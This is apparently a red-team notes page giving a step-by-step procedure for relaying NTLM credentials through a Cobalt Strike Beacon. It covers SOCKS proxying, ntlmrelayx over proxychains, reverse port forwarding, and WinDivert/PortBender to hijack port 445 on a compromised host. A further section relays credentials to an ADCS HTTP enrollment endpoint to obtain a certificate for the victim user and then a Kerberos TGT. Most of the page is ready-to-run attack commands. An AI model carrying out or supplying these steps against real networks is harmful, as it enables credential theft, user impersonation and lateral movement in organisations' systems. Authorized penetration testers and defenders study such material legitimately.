# NTLM Relaying with Cobalt Strike

- NTLM relaying is potentially a significant source of credentials for impersonating users, opening up paths in an environment
- On-premise NTLM relaying is fairly easy because the attacking machine can be plugged directly into the network and can listen on any port
- Typical red team engagement (off-premise) NTLM relaying is significantly more difficult because access to the network is through compromised hosts and you can't necessarily listen on any port (445 especially)
- External tooling is required to pull off NTLM relaying through a Cobalt Strike infrastructure

---

## Procedure

1. With a Beacon on a target, [[cobalt-strike-tunneling#SOCKS4 Proxy|start a SOCKS4 proxy on the Team Server]] that will dynamically forward traffic through the compromised target

```beacon
socks $SOCKS_PORT
```

2. Through [[proxychains]] pointing at the Team Server's SOCKS4 server, run [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) on the Team Server's TCP port 445

```bash
proxychains python3 $PATH_TO_NTLMRELAYX -t smb://$TARGET_IP -smb2support --no-http-server --no-wcf-server
```

- This will relay captured credentials to `$TARGET_IP`

3. Leverage Beacon's [[cobalt-strike-tunneling#Port Forward through Team Server rportfwd|rportfwd]] command to forward a high port (i.e., 8445) on the compromised target through the Team Server to `ntlmrelayx` on the Team Server's TCP port 445

```beacon
rportfwd $HIGH_PORT 127.0.0.1 445
```

4. Leverage a driver (like [WinDivert](https://reqrypt.org/windivert.html)) to forward traffic from the machine's TCP port 445 to the high port (i.e., 8445)

- Upload [WinDivert32.sys](https://github.com/praetorian-inc/PortBender/tree/main/static) or [WinDivert64.sys](https://github.com/praetorian-inc/PortBender/tree/main/static) to the compromised target (potentially in `C:\Windows\System32\drivers\`)
- Load [PortBender.cna](https://github.com/praetorian-inc/PortBender/tree/main/static) into Cobalt Strike to get access to the `PortBender` command in Beacon
- Start the forward

```beacon
PortBender redirect 445 $HIGH_PORT
```

---

## Relaying an NTLM to a ADCS HTTP Endpoint

Follow [[cobalt-strike-ntlm-relaying#Procedure|the above procedure]], but replace #2 with the following:

2. Through [[proxychains]] pointing at the Team Server's SOCKS4 server, run [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) on the Team Server's TCP port 445

```bash
proxychains python3 $PATH_TO_NTLMRELAYX -t http://$ADCS_HTTP_ENROLLMENT_ENDPOINT_HOSTNAME_OR_FQDN/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

- This will relay captured credentials to the ADCS HTTP endrollment endpoint and return a certificate for the relayed user
	- This is already a base64 encoded PFX certificate and thus can be used to [[rubeus#Request TGT using Base64-Encoded PFX Certificate|request a TGT]]
- **NOTE** that you can't relay from a target to itself. Thus, you can't target the computer the ADCS HTTP enrollment endpoint is running on. You'll have to target another computer

---

## Reference

[RastaMouse - NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
